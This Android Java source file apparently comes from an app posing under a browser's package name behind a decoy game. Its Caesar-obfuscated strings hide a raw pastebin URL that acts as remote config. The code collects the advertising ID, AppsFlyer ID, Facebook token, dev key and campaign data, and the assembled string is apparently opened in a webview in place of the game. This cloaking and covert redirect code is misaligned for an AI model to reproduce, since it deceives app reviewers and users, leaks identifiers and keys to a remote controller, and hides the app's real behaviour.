package com.UCMobile.in.web;

import static com.UCMobile.in.web.AppLinfFluer.xcvTomb;
import static com.UCMobile.in.web.SharedPref.setStrLineTomb;
import static com.UCMobile.in.web.SplaskTomp.navControllerSplTomb;
import static com.UCMobile.in.web.VarAndObj.*;

import android.content.Intent;
import android.util.Log;

import androidx.annotation.Nullable;

import com.UCMobile.in.GameActivityTomp;
import com.UCMobile.in.R;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MethodsWeb {
    public static void startGameTomb(){
        Log.i("MyLog", "startGame!");
        CON_OFFER_TOMB.startActivity(new Intent(CON_ACTIVITY_TOMB, GameActivityTomp.class));
        CON_OFFER_TOMB.finishAffinity();
    }
    public static void startWebAndTomb(){
        Log.i("MyLog", "startWeb!");
        String[] arrayDecodeTomb = new String[]{"", "?ogfkc_uqwteg=", "&iqqing_cfkf=", "&ch_wugtkf=", "&dwpfng=", "&hd_cv=", "&fgx_mga=", "&hd_crr_kf=",
                "&ch_ejcppgn=", "&ecorckip="};
        String[] arrayIDTomb = new String[]{DATA_FROM_GIST_TOMB[1], MAPS_APPS_TOMB[1], ID_TOMB, ID_LAST_APS_TOMB, CON_OFFER_TOMB.getPackageName(),
                CON_OFFER_TOMB.getString(R.string.facebook_token), CON_OFFER_TOMB.getString(R.string.appsfluer_id), CON_OFFER_TOMB.getString(R.string.facebook_id), MAPS_APPS_TOMB[2], MAPS_APPS_TOMB[0], MAPS_APPS_TOMB[3]};
        ArrayList<String> linkOrganicTomb = new ArrayList<>();

        for (int i = 0; i < arrayIDTomb.length; i++) {
            if (i == 0) {
                linkOrganicTomb.add(arrayIDTomb[i]);
            } else if (i == arrayIDTomb.length - 1) {
                linkOrganicTomb.add(arrayIDTomb[i]);
            } else {
                linkOrganicTomb.add(codSTomb(arrayDecodeTomb[i], 2) + arrayIDTomb[i]);
            }
        }

        StringBuilder builderTomb = new StringBuilder(linkOrganicTomb.size());
        for (String chAndrov : linkOrganicTomb) {
            builderTomb.append(chAndrov);
        }
        setStrLineTomb("lol", builderTomb.toString());
        navControllerSplTomb.navigate(R.id.action_splaskTomp_to_webTomp);
    }


    public static void AppsFl(){
        ID_LAST_APS_TOMB = AppsFlyerLib.getInstance().getAppsFlyerUID(CON_CONTEXXT_TOMB);
        AppsFlyerLib.getInstance().init(CON_CONTEXXT_TOMB.getString(R.string.appsfluer_id), xcvTomb, CON_CONTEXXT_TOMB);
        AppsFlyerLib.getInstance().start(CON_CONTEXXT_TOMB);
    }

    public static void OnesAndAdId(){
        try {
            ID_TOMB = AdvertisingIdClient.getAdvertisingIdInfo(CON_CONTEXXT_TOMB).getId();
        } catch (Exception exception) {
        }
        com.onesignal.OneSignal.setLogLevel(com.onesignal.OneSignal.LOG_LEVEL.VERBOSE, com.onesignal.OneSignal.LOG_LEVEL.NONE);
        com.onesignal.OneSignal.initWithContext(CON_CONTEXXT_TOMB);
        com.onesignal.OneSignal.setAppId(CON_CONTEXXT_TOMB.getString(R.string.onesignal_id));
        com.onesignal.OneSignal.setExternalUserId(ID_TOMB);
    }

    public static String subSubstring(String[] strings){
        StringBuilder resulTomb = new StringBuilder("");
        String[] mapTomb = new String[10];
        for (int i = 0; i < strings.length; i++) {
            mapTomb[i] = "&uwd" + (i + 1) + "=";
            resulTomb.append(codSTomb(mapTomb[i], 2)).append(strings[i]);
        }
        return String.valueOf(resulTomb);
    }
    public static void inFb(){
        MAPS_APPS_TOMB[3] = "";
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();
        AppLinkData.fetchDeferredAppLinkData(CON_CONTEXXT_TOMB, new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkDataTomb) {
                if (appLinkDataTomb == null) {
                    appLinkDataTomb = AppLinkData.createFromActivity(CON_ACTIVITY_TOMB);
                }
                if (appLinkDataTomb != null) {
                    int indexTomb = (Objects.requireNonNull(appLinkDataTomb.getTargetUri()).toString()).indexOf("://") + 3;
                    MAPS_APPS_TOMB[0] = (Objects.requireNonNull(appLinkDataTomb.getTargetUri()).toString()).substring(indexTomb);
                    MAPS_APPS_TOMB[3] = subSubstring( MAPS_APPS_TOMB[0].split("_"));
                }
            }
        });
    }



    public static void getDataFromGistTomb() {
        Request requestTomb;
        Call callTomb;
        OkHttpClient okHttpClientTomb = new OkHttpClient();

        requestTomb = new Request.Builder()
                .get()
                .url(codSTomb("jvvru://rcuvgdkp.eqo/tcy/Va1y8ORg", 2))
                .build();
        callTomb = okHttpClientTomb.newCall(requestTomb);
        callTomb.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                assert response.body() != null;
                DATA_FROM_GIST_TOMB = response.body().string().split("::");
                Log.i("MyLog", DATA_FROM_GIST_TOMB[0] + "  " + DATA_FROM_GIST_TOMB[1]);
            }
        });
    }

    public static String codSTomb(String aasd, int saad) {
        int x = Integer.parseInt("-" + saad);
        String string = "";
        for (int i = 0; i < aasd.length(); i++) {
            char c = aasd.charAt(i);
            if (c >= 'a' && c <= 'z') {
                c += x % 26;
                if (c < 'a')
                    c += 26;
                if (c > 'z')
                    c -= 26;
            } else if (c >= 'A' && c <= 'Z') {
                c += x % 26;
                if (c < 'A')
                    c += 26;
                if (c > 'Z')
                    c -= 26;
            }
            string += c;
        }
        return string;
    }

}
